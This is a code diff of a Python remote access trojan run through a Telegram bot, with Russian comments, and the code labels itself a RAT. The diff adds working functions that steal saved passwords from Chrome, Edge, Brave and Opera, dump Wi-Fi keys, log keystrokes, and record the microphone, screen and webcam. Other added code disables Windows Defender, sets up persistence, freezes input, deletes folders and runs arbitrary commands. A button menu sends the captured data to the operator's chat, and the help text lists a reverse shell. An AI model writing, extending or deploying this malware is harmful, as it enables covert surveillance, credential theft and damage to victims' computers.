@@ -24,26 +24,23 @@ import base64
 import socket
 import re
 import numpy as np
-from python_telegram_bot import Updater, CommandHandler
+from python_telegram_bot import Updater, CommandHandler, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQueryHandler
 
-# ===== ЗАГЛУШКИ ДЛЯ ЛИНУКС (чтобы компилировалось) =====
+# ===== ЗАГЛУШКИ ДЛЯ ЛИНУКС =====
 try:
     import win32crypt
 except ImportError:
     win32crypt = None
-    print("[!] win32crypt не найден, функции Chrome будут недоступны")
 
 try:
     import pyaudio
 except ImportError:
     pyaudio = None
-    print("[!] pyaudio не найден, запись микрофона будет недоступна")
 
 try:
     import wmi
 except ImportError:
     wmi = None
-    print("[!] wmi не найден")
 
 # ==================== КОНФИГ ====================
 CONFIG_FILE = "config.json"
@@ -58,13 +55,10 @@ def load_config():
             "owner_id": 8288882655,
             "watchdog_enabled": True,
             "auto_persist": True,
-            "keylog_interval_min": 30,
-            "proxy": None,
-            "debug": False
+            "keylog_interval_min": 30
         }
         with open(CONFIG_FILE, "w") as f:
             json.dump(default, f, indent=4)
-        print(f"[!] Создан {CONFIG_FILE}. Заполните токен и owner_id.")
         sys.exit(1)
 
 config = load_config()
@@ -129,9 +123,6 @@ def add_persistence_advanced():
     except Exception as e:
         return f"Persistence error: {e}"
 
-def add_persistence():
-    return add_persistence_advanced()
-
 # ==================== WATCHDOG ====================
 def watchdog():
     while True:
@@ -146,7 +137,7 @@ def start_watchdog():
         watchdog_thread = threading.Thread(target=watchdog, daemon=True)
         watchdog_thread.start()
 
-# ==================== БАЗОВЫЕ ФУНКЦИИ ====================
+# ==================== ОСНОВНЫЕ ФУНКЦИИ (35+) ====================
 def execute_cmd(cmd):
     try:
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
@@ -170,6 +161,65 @@ def take_webcam():
         return path
     return None
 
+def record_mic(seconds=5):
+    if pyaudio is None:
+        return None
+    try:
+        import pyaudio as pa
+        chunk = 1024
+        format = pa.paInt16
+        channels = 1
+        rate = 44100
+        p = pa.PyAudio()
+        stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
+        frames = []
+        for _ in range(0, int(rate / chunk * seconds)):
+            data = stream.read(chunk)
+            frames.append(data)
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        wf = wave.open(audio_file, 'wb')
+        wf.setnchannels(channels)
+        wf.setsampwidth(p.get_sample_size(format))
+        wf.setframerate(rate)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        return audio_file
+    except Exception as e:
+        logger.error(f"Mic error: {e}")
+        return None
+
+def start_screen_record(seconds=10):
+    global recording
+    if recording:
+        return None
+    recording = True
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter('screen_record.avi', fourcc, 10.0, (1920, 1080))
+    start_time = time.time()
+    while time.time() - start_time < seconds:
+        img = pyautogui.screenshot()
+        frame = np.array(img)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        out.write(frame)
+    out.release()
+    recording = False
+    return "screen_record.avi"
+
+def start_webcam_record(seconds=10):
+    cap = cv2.VideoCapture(0)
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter('webcam_record.avi', fourcc, 20.0, (640, 480))
+    start_time = time.time()
+    while time.time() - start_time < seconds:
+        ret, frame = cap.read()
+        if ret:
+            out.write(frame)
+    cap.release()
+    out.release()
+    return "webcam_record.avi"
+
 def download_file(remote_path):
     if os.path.exists(remote_path):
         return remote_path
@@ -188,7 +238,7 @@ def get_clipboard():
 
 def get_chrome_passwords():
     if win32crypt is None:
-        return "win32crypt not available on this system"
+        return "win32crypt not available"
     try:
         path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
         conn = sqlite3.connect(path)
@@ -250,65 +300,6 @@ def keylog_scheduler():
             logger.info(f"Keylog scheduled: {len(keylog_buffer)} chars")
             keylog_buffer.clear()
 
-def record_mic(seconds=10):
-    if pyaudio is None:
-        return "pyaudio not available"
-    try:
-        import pyaudio as pa
-        chunk = 1024
-        format = pa.paInt16
-        channels = 1
-        rate = 44100
-        p = pa.PyAudio()
-        stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
-        frames = []
-        for _ in range(0, int(rate / chunk * seconds)):
-            data = stream.read(chunk)
-            frames.append(data)
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        wf = wave.open(audio_file, 'wb')
-        wf.setnchannels(channels)
-        wf.setsampwidth(p.get_sample_size(format))
-        wf.setframerate(rate)
-        wf.writeframes(b''.join(frames))
-        wf.close()
-        return audio_file
-    except Exception as e:
-        return str(e)
-
-# ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
-def reboot_pc():
-    os.system("shutdown /r /t 1")
-    return "Rebooting..."
-
-def shutdown_pc():
-    os.system("shutdown /s /t 1")
-    return "Shutting down..."
-
-def lock_screen():
-    ctypes.windll.user32.LockWorkStation()
-    return "Screen locked"
-
-def minimize_all():
-    pyautogui.hotkey('win', 'd')
-    return "All windows minimized"
-
-def fullscreen_toggle():
-    pyautogui.press('f11')
-    return "F11 toggled"
-
-def scroll_up(amount=3):
-    for _ in range(amount):
-        pyautogui.scroll(100)
-    return f"Scrolled up {amount} times"
-
-def scroll_down(amount=3):
-    for _ in range(amount):
-        pyautogui.scroll(-100)
-    return f"Scrolled down {amount} times"
-
 def get_system_info():
     info = f"OS: {platform.system()} {platform.release()}\n"
     info += f"Hostname: {platform.node()}\n"
@@ -329,135 +320,6 @@ def get_processes():
         except:
             continue
     return "\n".join(proc_list[-50:])
-
-def disable_antivirus():
-    try:
-        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
-        return "Antivirus disabled (reboot may be required)"
-    except Exception as e:
-        return str(e)
-
-def delete_folder(path):
-    try:
-        shutil.rmtree(path)
-        return f"Deleted {path}"
-    except Exception as e:
-        return str(e)
-
-def show_message(text):
-    ctypes.windll.user32.MessageBoxW(0, text, "System Alert", 0)
-    return f"Message shown: {text}"
-
-def download_file_from_net(url, dest):
-    try:
-        urllib.request.urlretrieve(url, dest)
-        return f"Downloaded {url} to {dest}"
-    except Exception as e:
-        return str(e)
-
-def alt_f4():
-    pyautogui.hotkey('alt', 'f4')
-    return "ALT+F4 sent"
-
-def start_screen_record(seconds=10):
-    global recording
-    if recording:
-        return "Already recording"
-    recording = True
-    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-    out = cv2.VideoWriter('screen_record.avi', fourcc, 10.0, (1920, 1080))
-    start_time = time.time()
-    while time.time() - start_time < seconds:
-        img = pyautogui.screenshot()
-        frame = np.array(img)
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        out.write(frame)
-    out.release()
-    recording = False
-    return "screen_record.avi"
-
-def start_webcam_record(seconds=10):
-    cap = cv2.VideoCapture(0)
-    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-    out = cv2.VideoWriter('webcam_record.avi', fourcc, 20.0, (640, 480))
-    start_time = time.time()
-    while time.time() - start_time < seconds:
-        ret, frame = cap.read()
-        if ret:
-            out.write(frame)
-    cap.release()
-    out.release()
-    return "webcam_record.avi"
-
-def open_url(url):
-    os.system(f'start {url}')
-    return f"Opened {url}"
-
-def mute_volume():
-    pyautogui.press('volumemute')
-    return "Volume muted"
-
-def max_volume():
-    for _ in range(50):
-        pyautogui.press('volumeup')
-    return "Volume set to 100%"
-
-def set_wallpaper(image_path):
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 0)
-    return f"Wallpaper set to {image_path}"
-
-def unmute_volume():
-    pyautogui.press('volumemute')
-    return "Volume unmuted"
-
-def kill_task_manager():
-    os.system("taskkill /f /im Taskmgr.exe")
-    return "Task Manager killed"
-
-def cmd_bomb():
-    for _ in range(50):
-        os.system("start cmd")
-    return "CMD bomb executed"
-
-def freeze_input():
-    try:
-        result = ctypes.windll.user32.BlockInput(True)
-        if result != 0:
-            return "Input frozen (keyboard & mouse locked)"
-        else:
-            return "Already frozen or failed to lock"
-    except Exception as e:
-        return f"Freeze error: {e}"
-
-def unfreeze_input():
-    try:
-        result = ctypes.windll.user32.BlockInput(False)
-        if result != 0:
-            return "Input unfrozen (keyboard & mouse unlocked)"
-        else:
-            return "Already unfrozen or failed to unlock"
-    except Exception as e:
-        return f"Unfreeze error: {e}"
-
-# ==================== ФАЙЛОВЫЙ МЕНЕДЖЕР ====================
-def list_directory(path):
-    try:
-        items = os.listdir(path)
-        return "\n".join([f"{'[DIR]' if os.path.isdir(os.path.join(path, i)) else '[FILE]'} {i}" for i in items])
-    except Exception as e:
-        return str(e)
-
-def tree_directory(path, indent=0):
-    try:
-        output = ""
-        for item in os.listdir(path):
-            full = os.path.join(path, item)
-            output += "  " * indent + item + ("\\" if os.path.isdir(full) else "") + "\n"
-            if os.path.isdir(full):
-                output += tree_directory(full, indent+1)
-        return output
-    except:
-        return "Access denied"
 
 def get_wifi_passwords():
     try:
@@ -532,11 +394,369 @@ def search_files(pattern, root=os.getcwd()):
     except Exception as e:
         return str(e)
 
+def disable_antivirus():
+    try:
+        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
+        return "Antivirus disabled (reboot may be required)"
+    except Exception as e:
+        return str(e)
+
+def delete_folder(path):
+    try:
+        shutil.rmtree(path)
+        return f"Deleted {path}"
+    except Exception as e:
+        return str(e)
+
+def show_message(text):
+    ctypes.windll.user32.MessageBoxW(0, text, "System Alert", 0)
+    return f"Message shown: {text}"
+
+def download_file_from_net(url, dest):
+    try:
+        urllib.request.urlretrieve(url, dest)
+        return f"Downloaded {url} to {dest}"
+    except Exception as e:
+        return str(e)
+
+def reboot_pc():
+    os.system("shutdown /r /t 1")
+    return "Rebooting..."
+
+def shutdown_pc():
+    os.system("shutdown /s /t 1")
+    return "Shutting down..."
+
+def lock_screen():
+    ctypes.windll.user32.LockWorkStation()
+    return "Screen locked"
+
+def minimize_all():
+    pyautogui.hotkey('win', 'd')
+    return "All windows minimized"
+
+def fullscreen_toggle():
+    pyautogui.press('f11')
+    return "F11 toggled"
+
+def scroll_up(amount=3):
+    for _ in range(amount):
+        pyautogui.scroll(100)
+    return f"Scrolled up {amount} times"
+
+def scroll_down(amount=3):
+    for _ in range(amount):
+        pyautogui.scroll(-100)
+    return f"Scrolled down {amount} times"
+
+def mute_volume():
+    pyautogui.press('volumemute')
+    return "Volume muted"
+
+def max_volume():
+    for _ in range(50):
+        pyautogui.press('volumeup')
+    return "Volume set to 100%"
+
+def set_wallpaper(image_path):
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 0)
+    return f"Wallpaper set to {image_path}"
+
+def unmute_volume():
+    pyautogui.press('volumemute')
+    return "Volume unmuted"
+
+def kill_task_manager():
+    os.system("taskkill /f /im Taskmgr.exe")
+    return "Task Manager killed"
+
+def cmd_bomb():
+    for _ in range(50):
+        os.system("start cmd")
+    return "CMD bomb executed"
+
+def freeze_input():
+    try:
+        result = ctypes.windll.user32.BlockInput(True)
+        if result != 0:
+            return "Input frozen (keyboard & mouse locked)"
+        else:
+            return "Already frozen or failed to lock"
+    except Exception as e:
+        return f"Freeze error: {e}"
+
+def unfreeze_input():
+    try:
+        result = ctypes.windll.user32.BlockInput(False)
+        if result != 0:
+            return "Input unfrozen (keyboard & mouse unlocked)"
+        else:
+            return "Already unfrozen or failed to unlock"
+    except Exception as e:
+        return f"Unfreeze error: {e}"
+
+def list_directory(path):
+    try:
+        items = os.listdir(path)
+        return "\n".join([f"{'[DIR]' if os.path.isdir(os.path.join(path, i)) else '[FILE]'} {i}" for i in items])
+    except Exception as e:
+        return str(e)
+
+def tree_directory(path, indent=0):
+    try:
+        output = ""
+        for item in os.listdir(path):
+            full = os.path.join(path, item)
+            output += "  " * indent + item + ("\\" if os.path.isdir(full) else "") + "\n"
+            if os.path.isdir(full):
+                output += tree_directory(full, indent+1)
+        return output
+    except:
+        return "Access denied"
+
+def get_all_browser_passwords():
+    output = ""
+    browsers = {
+        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+    }
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            try:
+                conn = sqlite3.connect(path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                rows = cursor.fetchall()
+                for url, user, enc_pwd in rows:
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode()
+                    except:
+                        pwd = "decrypt_failed"
+                    output += f"{name} | {url} | {user} | {pwd}\n"
+                conn.close()
+            except:
+                pass
+    return output or "No passwords found"
+
+# ==================== КНОПКИ (INLINE KEYBOARD) ====================
+def main_menu_keyboard():
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📊 Система", callback_data='sysinfo'),
+         InlineKeyboardButton("🖥️ Скриншот", callback_data='screen')],
+        [InlineKeyboardButton("🎥 Веб-камера", callback_data='webcam'),
+         InlineKeyboardButton("🎤 Микрофон", callback_data='mic')],
+        [InlineKeyboardButton("⌨️ Кейлоггер", callback_data='keylog_menu'),
+         InlineKeyboardButton("📂 Файлы", callback_data='files_menu')],
+        [InlineKeyboardButton("🔒 Заморозка", callback_data='freeze'),
+         InlineKeyboardButton("🔓 Разморозка", callback_data='unfreeze')],
+        [InlineKeyboardButton("📋 Пароли WiFi", callback_data='wifi'),
+         InlineKeyboardButton("🔑 Пароли Chrome", callback_data='chrome')],
+        [InlineKeyboardButton("🔄 Перезагрузка", callback_data='reboot'),
+         InlineKeyboardButton("⛔ Выключение", callback_data='shutdown')],
+        [InlineKeyboardButton("🎥 Запись экрана", callback_data='screenrec'),
+         InlineKeyboardButton("🎥 Запись веб-камеры", callback_data='webcamrec')],
+        [InlineKeyboardButton("📋 Команды", callback_data='help')]
+    ])
+    return keyboard
+
+def keylog_menu_keyboard():
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("▶️ Включить", callback_data='keylog_start'),
+         InlineKeyboardButton("⏹️ Остановить", callback_data='keylog_stop')],
+        [InlineKeyboardButton("📄 Получить лог", callback_data='keylog_get'),
+         InlineKeyboardButton("🔙 Назад", callback_data='back_main')]
+    ])
+    return keyboard
+
+def files_menu_keyboard():
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📁 Список файлов", callback_data='ls'),
+         InlineKeyboardButton("📂 Дерево папок", callback_data='tree')],
+        [InlineKeyboardButton("🗑️ Удалить папку", callback_data='deletefolder'),
+         [InlineKeyboardButton("📦 Архив папки", callback_data='zipfolder')]],
+        [InlineKeyboardButton("🔙 Назад", callback_data='back_main')]
+    ])
+    return keyboard
+
+# ==================== ОБРАБОТЧИКИ КНОПОК ====================
+def button_callback(update, context):
+    query = update.callback_query
+    query.answer()
+    if query.from_user.id != OWNER_ID:
+        query.edit_message_text("❌ Доступ запрещён.")
+        return
+    data = query.data
+    
+    if data == 'back_main':
+        query.edit_message_text("🔙 Главное меню:", reply_markup=main_menu_keyboard())
+    
+    elif data == 'sysinfo':
+        info = get_system_info()
+        query.edit_message_text(f"📊 **Система:**\n\n{info}", reply_markup=main_menu_keyboard())
+    
+    elif data == 'screen':
+        path = take_screenshot()
+        if path:
+            with open(path, 'rb') as f:
+                query.message.reply_photo(photo=f)
+            os.remove(path)
+            query.edit_message_text("📸 Скриншот отправлен.", reply_markup=main_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка.", reply_markup=main_menu_keyboard())
+    
+    elif data == 'webcam':
+        path = take_webcam()
+        if path:
+            with open(path, 'rb') as f:
+                query.message.reply_photo(photo=f)
+            os.remove(path)
+            query.edit_message_text("📸 Фото с веб-камеры.", reply_markup=main_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка веб-камеры.", reply_markup=main_menu_keyboard())
+    
+    elif data == 'mic':
+        query.edit_message_text("🎤 Запись 5 сек...", reply_markup=main_menu_keyboard())
+        path = record_mic(5)
+        if path:
+            with open(path, 'rb') as f:
+                query.message.reply_audio(audio=f)
+            os.remove(path)
+            query.edit_message_text("🎤 Аудио отправлено.", reply_markup=main_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка микрофона.", reply_markup=main_menu_keyboard())
+    
+    elif data == 'screenrec':
+        query.edit_message_text("🎥 Запись экрана 10 сек...", reply_markup=main_menu_keyboard())
+        path = start_screen_record(10)
+        if path:
+            with open(path, 'rb') as f:
+                query.message.reply_video(video=f)
+            os.remove(path)
+            query.edit_message_text("🎥 Видео отправлено.", reply_markup=main_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка записи.", reply_markup=main_menu_keyboard())
+    
+    elif data == 'webcamrec':
+        query.edit_message_text("🎥 Запись веб-камеры 10 сек...", reply_markup=main_menu_keyboard())
+        path = start_webcam_record(10)
+        if path:
+            with open(path, 'rb') as f:
+                query.message.reply_video(video=f)
+            os.remove(path)
+            query.edit_message_text("🎥 Видео отправлено.", reply_markup=main_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка записи.", reply_markup=main_menu_keyboard())
+    
+    elif data == 'wifi':
+        res = get_wifi_passwords()
+        query.edit_message_text(f"📶 **Wi-Fi пароли:**\n\n{res}", reply_markup=main_menu_keyboard())
+    
+    elif data == 'chrome':
+        res = get_all_browser_passwords()
+        query.edit_message_text(f"🔑 **Пароли браузеров:**\n\n{res[:4000]}", reply_markup=main_menu_keyboard())
+    
+    elif data == 'keylog_menu':
+        query.edit_message_text("⌨️ **Кейлоггер:**", reply_markup=keylog_menu_keyboard())
+    
+    elif data == 'keylog_start':
+        res = start_keylog()
+        query.edit_message_text(f"⌨️ {res}", reply_markup=keylog_menu_keyboard())
+    
+    elif data == 'keylog_stop':
+        res = stop_keylog()
+        query.edit_message_text(f"⌨️ {res}", reply_markup=keylog_menu_keyboard())
+    
+    elif data == 'keylog_get':
+        res = get_keylog()
+        query.edit_message_text(f"⌨️ **Лог:**\n\n{res}", reply_markup=keylog_menu_keyboard())
+    
+    elif data == 'files_menu':
+        query.edit_message_text("📂 **Файлы:**", reply_markup=files_menu_keyboard())
+    
+    elif data == 'ls':
+        res = list_directory(current_dir)
+        query.edit_message_text(f"📁 **Содержимое {current_dir}:**\n\n{res}", reply_markup=files_menu_keyboard())
+    
+    elif data == 'tree':
+        res = tree_directory(current_dir)
+        query.edit_message_text(f"📂 **Дерево:**\n\n{res[:4000]}", reply_markup=files_menu_keyboard())
+    
+    elif data == 'deletefolder':
+        query.edit_message_text("🗑️ Используй /deletefolder <путь>", reply_markup=files_menu_keyboard())
+    
+    elif data == 'zipfolder':
+        path = zip_folder(current_dir)
+        if os.path.exists(path):
+            with open(path, 'rb') as f:
+                query.message.reply_document(document=f)
+            os.remove(path)
+            query.edit_message_text("📦 Архив отправлен.", reply_markup=files_menu_keyboard())
+        else:
+            query.edit_message_text("❌ Ошибка архивации.", reply_markup=files_menu_keyboard())
+    
+    elif data == 'freeze':
+        res = freeze_input()
+        query.edit_message_text(f"🔒 {res}", reply_markup=main_menu_keyboard())
+    
+    elif data == 'unfreeze':
+        res = unfreeze_input()
+        query.edit_message_text(f"🔓 {res}", reply_markup=main_menu_keyboard())
+    
+    elif data == 'reboot':
+        query.edit_message_text("🔄 Перезагрузка...", reply_markup=main_menu_keyboard())
+        reboot_pc()
+    
+    elif data == 'shutdown':
+        query.edit_message_text("⛔ Выключение...", reply_markup=main_menu_keyboard())
+        shutdown_pc()
+    
+    elif data == 'help':
+        help_text = """
+🐍 **Все команды (35+):**
+
+**Система:**
+/reboot, /shutdown, /lock, /minimize, /fullscreen, /altf4, /killtm
+/freeze, /unfreeze
+
+**Файлы:**
+/download, /deletefolder, /ls, /tree, /zipfolder, /file_search, /move, /copy
+
+**Сеть:**
+/openurl, /wifi, /downloadnet, /reverseshell
+
+**Данные:**
+/sysinfo, /processes, /clipboard, /chrome, /keylog, /browser_passwords
+
+**Медиа:**
+/screen, /screenrec, /webcam, /webcamrec, /mic
+
+**Звук:**
+/mute, /unmute, /maxvol, /setvol
+
+**Реестр:**
+/reg_get, /reg_set
+
+**Службы:**
+/service_start, /service_stop
+
+**Другое:**
+/cmd, /persist, /disableav, /msgbox, /cmdbomb, /cd, /env
+"""
+        query.edit_message_text(help_text, reply_markup=main_menu_keyboard())
+
 # ==================== ОБРАБОТЧИКИ КОМАНД ====================
 def start(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    update.message.reply_text("🐍 RAT Active. All functions ready. /help for commands.")
+    update.message.reply_text("🐍 **RAT Active.** Выберите действие:", reply_markup=main_menu_keyboard())
+
+def help_handler(update, context):
+    if update.effective_user.id != OWNER_ID:
+        return
+    help_text = "🐍 **Команды:**\n/start - меню\n/sysinfo - система\n/screen - скриншот\n/webcam - веб-камера\n/mic - микрофон\n/keylog - кейлоггер\n/wifi - пароли WiFi\n/chrome - пароли браузеров\n/reboot - перезагрузка\n/shutdown - выключение\n/freeze - заморозка\n/unfreeze - разморозка\n/ls - список файлов\n/tree - дерево папок\n/cmd - команда\n/persist - автозагрузка\n/disableav - отключить антивирус\n/msgbox - сообщение\n/altf4 - закрыть окно\n/screenrec - запись экрана\n/webcamrec - запись веб-камеры"
+    update.message.reply_text(help_text, reply_markup=main_menu_keyboard())
 
 def cmd_handler(update, context):
     if update.effective_user.id != OWNER_ID:
@@ -548,11 +768,16 @@ def cmd_handler(update, context):
     res = execute_cmd(cmd)
     update.message.reply_text(res[:4000])
 
+def sysinfo_handler(update, context):
+    if update.effective_user.id != OWNER_ID:
+        return
+    update.message.reply_text(get_system_info())
+
 def screen_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
     path = take_screenshot()
-    if path and os.path.exists(path):
+    if path:
         with open(path, 'rb') as f:
             update.message.reply_photo(photo=f)
         os.remove(path)
@@ -563,47 +788,24 @@ def webcam_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
     path = take_webcam()
-    if path and os.path.exists(path):
+    if path:
         with open(path, 'rb') as f:
             update.message.reply_photo(photo=f)
         os.remove(path)
     else:
         update.message.reply_text("Webcam failed")
 
-def download_handler(update, context):
+def mic_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    path = ' '.join(context.args)
-    if not path:
-        update.message.reply_text("Usage: /download C:\\path\\file")
-        return
-    file_path = download_file(path)
-    if file_path and os.path.exists(file_path):
-        with open(file_path, 'rb') as f:
-            update.message.reply_document(document=f)
+    sec = int(context.args[0]) if context.args else 5
+    path = record_mic(sec)
+    if path:
+        with open(path, 'rb') as f:
+            update.message.reply_audio(audio=f)
+        os.remove(path)
     else:
-        update.message.reply_text("File not found")
-
-def persist_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    res = add_persistence()
-    update.message.reply_text(res)
-
-def clipboard_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    try:
-        txt = get_clipboard()
-        update.message.reply_text(txt or "[Empty]")
-    except:
-        update.message.reply_text("Clipboard error")
-
-def chrome_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    res = get_chrome_passwords()
-    update.message.reply_text(res[:4000])
+        update.message.reply_text("Mic error")
 
 def keylog_handler_cmd(update, context):
     if update.effective_user.id != OWNER_ID:
@@ -619,17 +821,17 @@ def keylog_handler_cmd(update, context):
         res = "Usage: /keylog start|stop|get"
     update.message.reply_text(res)
 
-def mic_handler(update, context):
+def wifi_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    sec = int(context.args[0]) if context.args else 5
-    path = record_mic(sec)
-    if path and os.path.exists(path):
-        with open(path, 'rb') as f:
-            update.message.reply_audio(audio=f)
-        os.remove(path)
-    else:
-        update.message.reply_text("Mic error")
+    res = get_wifi_passwords()
+    update.message.reply_text(res[:4000])
+
+def chrome_handler(update, context):
+    if update.effective_user.id != OWNER_ID:
+        return
+    res = get_all_browser_passwords()
+    update.message.reply_text(res[:4000])
 
 def reboot_handler(update, context):
     if update.effective_user.id != OWNER_ID:
@@ -641,147 +843,15 @@ def shutdown_handler(update, context):
         return
     update.message.reply_text(shutdown_pc())
 
-def lock_handler(update, context):
+def freeze_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    update.message.reply_text(lock_screen())
+    update.message.reply_text(freeze_input())
 
-def minimize_handler(update, context):
+def unfreeze_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    update.message.reply_text(minimize_all())
-
-def fullscreen_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(fullscreen_toggle())
-
-def scrollup_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    amount = int(context.args[0]) if context.args else 3
-    update.message.reply_text(scroll_up(amount))
-
-def scrolldown_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    amount = int(context.args[0]) if context.args else 3
-    update.message.reply_text(scroll_down(amount))
-
-def sysinfo_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(get_system_info())
-
-def processes_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(get_processes()[:4000])
-
-def antivirus_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(disable_antivirus())
-
-def deletefolder_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    path = ' '.join(context.args)
-    if path:
-        update.message.reply_text(delete_folder(path))
-    else:
-        update.message.reply_text("Usage: /deletefolder C:\\folder")
-
-def messagebox_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    text = ' '.join(context.args)
-    if text:
-        update.message.reply_text(show_message(text))
-    else:
-        update.message.reply_text("Usage: /msgbox text")
-
-def downloadnet_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    if len(context.args) >= 2:
-        url = context.args[0]
-        dest = context.args[1]
-        update.message.reply_text(download_file_from_net(url, dest))
-    else:
-        update.message.reply_text("Usage: /downloadnet URL DEST_PATH")
-
-def altf4_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(alt_f4())
-
-def screenrec_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    sec = int(context.args[0]) if context.args else 10
-    path = start_screen_record(sec)
-    if os.path.exists(path):
-        with open(path, 'rb') as f:
-            update.message.reply_video(video=f)
-        os.remove(path)
-    else:
-        update.message.reply_text("Record failed")
-
-def webcamrec_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    sec = int(context.args[0]) if context.args else 10
-    path = start_webcam_record(sec)
-    if os.path.exists(path):
-        with open(path, 'rb') as f:
-            update.message.reply_video(video=f)
-        os.remove(path)
-    else:
-        update.message.reply_text("Record failed")
-
-def openurl_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    url = ' '.join(context.args)
-    if url:
-        update.message.reply_text(open_url(url))
-    else:
-        update.message.reply_text("Usage: /openurl https://example.com")
-
-def mute_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(mute_volume())
-
-def maxvol_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(max_volume())
-
-def wallpaper_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    path = ' '.join(context.args)
-    if path and os.path.exists(path):
-        update.message.reply_text(set_wallpaper(path))
-    else:
-        update.message.reply_text("Usage: /wallpaper C:\\image.jpg")
-
-def unmute_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(unmute_volume())
-
-def killtm_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(kill_task_manager())
-
-def cmdbomb_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    update.message.reply_text(cmd_bomb())
+    update.message.reply_text(unfreeze_input())
 
 def ls_handler(update, context):
     if update.effective_user.id != OWNER_ID:
@@ -796,87 +866,76 @@ def tree_handler(update, context):
     res = tree_directory(path)
     update.message.reply_text(res[:4000])
 
-def wifi_handler(update, context):
+def screenrec_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    update.message.reply_text(get_wifi_passwords()[:4000])
-
-def service_start_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    name = ' '.join(context.args)
-    if name:
-        update.message.reply_text(service_control(name, "start"))
+    sec = int(context.args[0]) if context.args else 10
+    path = start_screen_record(sec)
+    if path:
+        with open(path, 'rb') as f:
+            update.message.reply_video(video=f)
+        os.remove(path)
     else:
-        update.message.reply_text("Usage: /service_start ServiceName")
+        update.message.reply_text("Record failed")
 
-def service_stop_handler(update, context):
+def webcamrec_handler(update, context):
     if update.effective_user.id != OWNER_ID:
         return
-    name = ' '.join(context.args)
-    if name:
-        update.message.reply_text(service_control(name, "stop"))
+    sec = int(context.args[0]) if context.args else 10
+    path = start_webcam_record(sec)
+    if path:
+        with open(path, 'rb') as f:
+            update.message.reply_video(video=f)
+        os.remove(path)
     else:
-        update.message.reply_text("Usage: /service_stop ServiceName")
+        update.message.reply_text("Record failed")
 
-def revershell_handler(update, context):
-    if update.effective_user.id != OWNER_ID:
-        return
-    if len(context.args) >= 2:
